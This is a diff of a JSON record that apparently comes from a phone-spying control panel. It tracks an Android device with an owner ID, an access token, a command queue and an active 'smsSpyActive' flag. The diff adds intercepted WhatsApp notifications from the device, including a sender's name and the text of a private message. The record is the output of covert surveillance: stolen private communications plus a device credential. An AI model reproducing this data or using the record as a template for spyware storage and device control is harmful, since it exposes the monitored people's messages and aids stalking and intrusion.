@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777173151530,
+    "lastSeen": 1777173157111,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (133 pesan): ~ sasa sikma",
+        "content": "ngetod uuk",
+        "time": "26/04 11:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173153355
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1137 pesan dari 19 chat",
+        "time": "26/04 11:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173153334
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
